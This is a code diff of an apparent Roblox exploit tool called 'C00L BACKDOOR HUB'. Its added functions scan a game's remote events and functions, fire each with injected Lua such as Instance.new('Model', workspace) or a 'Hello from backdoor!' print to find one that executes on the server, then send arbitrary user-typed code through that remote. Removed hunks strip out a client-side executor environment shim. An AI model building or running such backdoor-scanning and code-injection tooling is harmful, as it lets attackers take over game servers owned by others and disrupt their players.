@@ -30,6 +30,7 @@ print([[C00L BACKDOOR HUB!
 |__| |__||_______||_______|                                              
 
 ]])
+
 -- notifaction creator
 function create(title,text)
 	task.wait()
@@ -46,11 +47,13 @@ end
 
 -- services
 local TweenService = game:GetService("TweenService")
+HttpService=game:GetService("HttpService")
 
 -- just simple function to do ( "example" and etc)
 function add(str,txt)
 	return txt..str..txt
 end
+
 
 -- music list
 local musiclist = {
@@ -833,7 +836,8 @@ local function gui_create()
 	end)
 
 	textButton.MouseButton1Click:Connect(function()
-		r:InvokeServer(textbox.Text)
+		runRemote(r,textbox.Text)
+
 	end)
 
 	closebutton(frame,plrGui_)
@@ -845,7 +849,7 @@ local function gui_create()
 	clear.TextColor3 = Color3.fromRGB(255,255,255)
 	clear.Position = UDim2.new(0.63,0,.7+clear.Size.Y.Scale/2.6,0)
 	clear.TextScaled = true
-	clear.MouseButton1Click:Connect(function()
+	clear.MouseButton1Click:Connect(function() 
 		textbox.Text = ""
 	end)
 
@@ -867,8 +871,60 @@ else
 end
 
 -- backdoor finding (may not good)
+local code
+
+alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+function generateName(lenght)
+
+	local text=''
+
+	for i=1,lenght do
+		text=text..alphabet[math.random(1,#alphabet)]
+	end
+
+	return text
+
+end
+
+function runRemote(remote:Instance,func)
+	if remote:IsA("RemoteEvent") then
+		remote:FireServer(func)
+	elseif remote:IsA("RemoteFunction") then
+		spawn(function()
+			remote:InvokeServer(func)
+		end)
+	end
+end
+
+remotes = nil
+
+local function filterRemote(r, remotes)
+	if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
+		table.insert(remotes, r);
+	end
+end
+
+local function getRemotes()
+	local remotes = {};
+	for i, r in ipairs(game:GetDescendants()) do
+		filterRemote(r, remotes);
+	end;
+	-- check getnilinstances support
+	if getnilinstances == nil then
+		return remotes;
+	end
+	for i, r in ipairs(getnilinstances()) do
+		filterRemote(r, remotes);
+	end;
+	return remotes;
+end;
+
 local function find()
+	local timee=os.clock()
+
 	local finds =  nil
+
+	local foundas = true
 
 	for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
 		if v.Name == "." then
@@ -879,41 +935,149 @@ local function find()
 
 	if finds == nil then
 		create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
-		return false
+		foundas = false
 	end
-
-	if finds:GetTags()[1] == "WAWACODE" then
-		if finds:GetAttribute("Day")==setter:GetAttribute("Day")
-			and finds:GetAttribute("Month")==setter:GetAttribute("Month")
-			and finds:GetAttribute("Years")==setter:GetAttribute("Years")
-			and finds:GetAttribute("IsWeekend")==weekend then
-			r = finds
-			return true
+	if foundas == true then
+		if finds:GetTags()[1] == "WAWACODE" then
+			if finds:GetAttribute("Day")==setter:GetAttribute("Day")
+				and finds:GetAttribute("Month")==setter:GetAttribute("Month")
+				and finds:GetAttribute("Years")==setter:GetAttribute("Years")
+				and finds:GetAttribute("IsWeekend")==weekend then
+				r = finds
+				foundas = true
+			else
+				local day,month,year,weekend = finds:GetAttribute("Day"),finds:GetAttribute("Month"),finds:GetAttribute("Years"),find:GetAttribute("Weekend")
+				create("Error!", "Date you entered not match. Please rejoin to fresh new server. More info: "..day.."/"..month.."/"..year..". Weekend: "..tostring(weekend)..". Backdoor will not work here. Sorry! D:")
+				foundas = false
+			end
 		else
-			local day,month,year,weekend = finds:GetAttribute("Day"),finds:GetAttribute("Month"),finds:GetAttribute("Years"),find:GetAttribute("Weekend")
-			create("Error!", "Date you entered not match. Please rejoin to fresh new server. More info: "..day.."/"..month.."/"..year..". Weekend: "..tostring(weekend)..". Backdoor will not work here. Sorry! D:")
-			return false
-		end
-	else
 
-		local found = false
-		local obj = nil
-		for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
-			if v.Name == "." and v:GetTags()[1] == "WAWACODE" then
-				found = true
-				obj = v
-				break
+			local found = false
+			local obj = nil
+			for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
+				if v.Name == "." and v:GetTags()[1] == "WAWACODE" then
+					found = true
+					obj = v
+					break
+				end
+			end
+
+			if found == false then
+				create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
+				foundas = false
+			end
+			if found == true and obj:GetTags()[1] ~= "WAWACODE" then
+				create("Error!", "Remote Event/Function is fake one by developers. Backdoor will not work here. Sorry! D:")
+				foundas=false
 			end
 		end
+		return foundas
+	end
+	local check2 = true
+	task.wait(2)
+	if foundas==false then
+		create("Not found c00lspawnn's backdoor remote", "finding lalol hub's backdoor remote. ".. os.clock()- timee.."s")
+		
+		local remotes={}
 
-		if found == false then
-			create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
-			return false
+		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+			while true do
+				code=generateName(math.random(12,30))
+				if not remotes[code] then break end
+			end
+			spawn(function() protected_backdoor:InvokeServer('idk,,,', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+			remotes[code]=protected_backdoor
 		end
-		if found == true and obj:GetTags()[1] ~= "WAWACODE" then
-			create("Error!", "Remote Event/Function is fake one by developers. Backdoor will not work here. Sorry! D:")
-			return false
+
+		for i,remote in game:GetDescendants() do
+
+			-- Validation Checker
+
+			if not remote:IsA('RemoteEvent') then 
+				if not remote:IsA('RemoteFunction') then continue end
+			end
+
+			-- RobloxReplicatedStorage
+			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
+		--		debug('Roblox Replicated Storage ('..remote.Name..')', 1)
+				continue
+			end
+
+			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
+				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
+				--	debug('Adonis filter detected ('..remote.Name..')', 1)
+					continue
+				end
+
+				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
+			--		debug('HD Admin ('..remote.Name..')', 1)
+					continue
+				end
+				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
+			--		debug('Chat event ('..remote.Name..')', 1)
+					continue
+				end
+			end
+
+			-- Backdoor Sender
+
+			while true do
+				code=generateName(math.random(12,30))
+				if not remotes[code] then break end
+			end
+
+			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+			remotes[code]=remote
+
 		end
+
+		-- Backdoor Checker
+
+		for i=1,100 do
+
+			for i,remote in remotes do
+				local code=i
+
+				if workspace:FindFirstChild(code) then
+
+
+					r=remote
+					create("Found!", "Found LALOL's hub backdoor remote in "..os.clock()-timee.."s")
+					return true
+				end
+				--				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
+			end
+
+			wait()--.1)
+
+		end
+
+		check2 = false
+	end
+	task.wait(2)
+	if check2 == false then
+		create("Not Found LALOL's hub backdoor remote.", "Searching for custom backdoors remote.")
+		remotes = remotes or getRemotes();
+		
+		for i, rem in ipairs(remotes) do
+			if check2 == true then break end;
+			if rem:IsA("RemoteEvent") then
+				rem:FireServer("print('Hello from backdoor!')")
+			elseif rem:IsA("RemoteFunction") then
+				rem:InvokeServer("print('Hello from backdoor!')")
+			end
+			
+			game.LogService.MessageOut:Connect(function(msg)
+				if msg:lower():find('hello from backdoor!') then
+					create("Backdoor found!", "Backdoor is in control of your game.")
+					check2 = true
+					r = rem
+					return true
+				end
+			end)
+			
+		end;
 	end
 end
 
@@ -934,264 +1098,9 @@ function from_base64(data)
 	end))
 end
 
-local env = {}
-local nil_instances = {}
-local required = {}
-local unlock_table
-
-local function newcclosure(func) 
-	return function(...)
-		return func(...)
-	end
-end
-
-local function printidentity()
-	print("Current Identify Is 2")
-end
-
-unlock_table = function(v)
-	local t = {}
-	for i, v in pairs(v) do
-		if type(v) == "table" then
-			t[i] = unlock_table(v)
-		elseif type(v) == "function" then
-			t[i] = newcclosure(v)
-		else
-			t[i] = v
-		end
-	end
-	return t
-end
--- Normal Globals
-
-local function fake_loadstring(code : string)
-	return loadstring(code, env)
-end
-
-
-local function gethui()
-	return game.Players.LocalPlayer.PlayerGui
-end
-
-local function identifyexecutor()
-	return "CS BACKDOOR HUB"
-end
-
-local function getinstances()
-	return game:GetDescendants()
-end
-local function getnilinstances()
-	return nil_instances
-end
-
-local function getscripts()
-	local scripts = {}
-	for i, v in pairs(getinstances()) do
-		if v:IsA("LocalScript") or v:IsA("ModuleScript") then
-			table.insert(scripts, v)
-		end
-	end
-	for i, v in pairs(getnilinstances()) do
-		if v:IsA("LocalScript") or v:IsA("ModuleScript") then
-			table.insert(scripts, v)
-		end
-	end
-	return scripts
-end
-
-local crypt = {
-	base64 = {},
-}
-
-local function isreadonly(mt)
-	return not ({pcall(getmetatable, mt)})[1]
-end
-
-local function getrenv()
-	return getfenv(0)
-end
-
-local function debug_getinfo(f)
-	return {
-		source = debug.info(f, "s"),
-		what = "",
-		numparams = debug.info(f, "a")[1],	
-		currentline = debug.info(f, "l"),
-		is_vararg = 0,
-		name = debug.info(f, "n"),
-		func = debug.info(f, "f"),
-		nups = 0,
-		short_src = ""
-	}
-end
-
-local function getreg()
-	local reg = {}
-	local dump_table
-	dump_table = function(t)
-		for i, v in pairs(t) do
-			table.insert(reg, v)
-			if type(v) == "table" then
-				dump_table(v)
-			end
-		end
-	end
-	dump_table(env)
-	for i, v in pairs(env) do
-		if type(v) == "table" then
-			reg[i] = v
-		end
-	end
-	return reg
-end
-
-
-do
-	-- tables
-	env["math"] = math
-	env["table"] = table
-	env["string"] = string
-	env["debug"] = debug
-	env["Vector2"] = Vector2
-	env["Vector3"] = Vector3
-	env["CFrame"] = CFrame
-	env["UDim"] = UDim
-	env["UDim2"] = UDim2
-	env["workspace"] = workspace
-	env["Workspace"] = workspace
-	env["game"] = game
-	env["Game"] = game
-	env["Random"] = Random
-	env["Enum"] = Enum
-	env["Rect"] = Rect
-	env["Region3int16"] = Region3int16
-	env["Region3"] = Region3
-	env["Vector2int16"] = Vector2int16
-	env["Vector3int16"] = Vector3int16
-	env["RaycastParams"] = RaycastParams
-	env["Ray"] = Ray
-	env["RotationCurveKey"] = RotationCurveKey
-	env["TweenInfo"] = TweenInfo
-	env["task"] = task
-	env["utf8"] = utf8
-	env["Instance"] = Instance
-	env["os"] = os
-	env["OverlapParams"] = OverlapParams
-	env["plugin"] = plugin
-	env["DockWidgetPluginGuiInfo"] = DockWidgetPluginGuiInfo
-	env["PhysicalProperties"] = PhysicalProperties
-	env["PathWaypoint"] = PathWaypoint
-	env["Axes"] = Axes
-	env["shared"] = shared
-	env["DateTime"] = DateTime
-	env["File"] = File
-	env["Font"] = Font
-	env["Faces"] = Faces
-	env["FloatCurveKey"] = FloatCurveKey
-	env["Color3"] = Color3
-	env["ColorSequence"] = ColorSequence
-	env["ColorSequenceKeypoint"] = ColorSequenceKeypoint
-	env["BrickColor"] = BrickColor
-	env["NumberRange"] = NumberRange
-	env["NumberSequence"] = NumberSequence
-	env["NumberSequenceKeypoint"] = NumberSequenceKeypoint
-	env["_G"] = {}
-
-	-- functions
-	env["wait"] = wait
-	env["Wait"] = wait
-	env["delay"] = delay
-	env["Delay"] = delay
-	env["spawn"] = spawn
-	env["Spawn"] = spawn
-	env["pcall"] = pcall
-	env["xpcall"] = xpcall
-	env["ypcall"] = ypcall
-	env["print"] = print
-	env["warn"] = warn
-	env["error"] = error
-	env["elapsedTime"] = elapsedTime
-	env["ElapsedTime"] = elapsedTime
-	env["require"] = function(module : ModuleScript)
-		if module then
-			table.insert(required, module)
-		end
-		return require(module)
-	end
-	env["rawget"] = rawget
-	env["rawset"] = rawset
-	env["rawlen"] = rawlen
-	env["rawequal"] = rawequal
-	env["tostring"] = tostring
-	env["tonumber"] = tonumber
-	env["time"] = time
-	env["tick"] = tick
-	env["typeof"] = typeof
-	env["type"] = type
-	env["unpack"] = unpack
-	env["UserSettings"] = UserSettings
-	env["ipairs"] = ipairs
-	env["pairs"] = pairs
-	env["assert"] = assert
-	env["setmetatable"] = setmetatable
-	env["settings"] = settings
-	env["getfenv"] = getfenv
-	env["setfenv"] = setfenv
-	env["select"] = select
-	env["getmetatable"] = getmetatable
-	env["stats"] = stats
-	env["Stats"] = stats
-	env["gcinfo"] = gcinfo
-	env["collectgarbage"] = collectgarbage
-	env["version"] = version
-	env["Version"] = version
-	env["newproxy"] = newproxy
-	env["next"] = next
-
-	-- misc
-	env["script"] = Instance.new("LocalScript")
-	env["_VERSION"] = "LuaU"
-
-	env = unlock_table(env)
-end
-
 local function setclipboardfunc(str : string)
 	setclipboard(str)
 	create("Clipboard","Copy clipboard has been used")
-end
-
-local function getloadedmodules()
-	return required
-end
-
-do
-	env["gethui"] = gethui
-	env["getinstances"] = getinstances
-	env["getnilinstances"] = getnilinstances
-	env["getscripts"] = getscripts
-	env["newcclosure"] = newcclosure
-	env["crypt"] = crypt
-	env["isreadonly"] = isreadonly
-	env["printidentity"] = printidentity
-	env["identifyexecutor"] = identifyexecutor
-	env["getgenv"] = function()
-		return env 
-	end
-	env["loadstring"] = fake_loadstring
-	env["debug"] = unlock_table(env["debug"]) -- unlock debug to edit
-	env["debug"]["getinfo"] = debug_getinfo -- add function
-	env["debug"] = table.freeze(env["debug"]) -- lock again
-	env["bit"] = bit32
-	env["setclipboard"] = setclipboardfunc
-	env["getloadedmodules"] = getloadedmodules
-	env["getrenv"] = getrenv
-	env["getreg"] = getreg
-	env["cloneref"] = function(i)return(i)end
-end
-
-
-local function client_side_executor()
-	
 end
 
 local bindable = Instance.new("BindableFunction")
@@ -1200,10 +1109,6 @@ bindable.OnInvoke = function(option)
 		music_creator()
 	end
 end
-
-spawn(function()
-	loadstring("print(Hello World!")()
-end)
 
 -- create hub
 local function createHandler()
@@ -1217,7 +1122,7 @@ local function createHandler()
 	local is_found = find()
 	if is_found==false then
 		task.wait(1)		
-		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n What you wanna open?",5,"Music Player","Client Side Executor",bindable)
+		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n What you wanna open?",5,"Music Player","",bindable)
 		return
 	end
 	
@@ -1378,7 +1283,7 @@ local function createHandler()
 		temp.MouseButton1Click:Connect(function()
 			if temp.Text == "Reset" then
 				remove()
-				r:InvokeServer("game.Players."..game.Players.LocalPlayer.Name..":LoadCharacter()")				
+				runRemote(r,"game.Players."..game.Players.LocalPlayer.Name..":LoadCharacter()")		
 			elseif temp.Text == "Inject" then
 				gui_create()
 			elseif temp.Text == "Music player" then
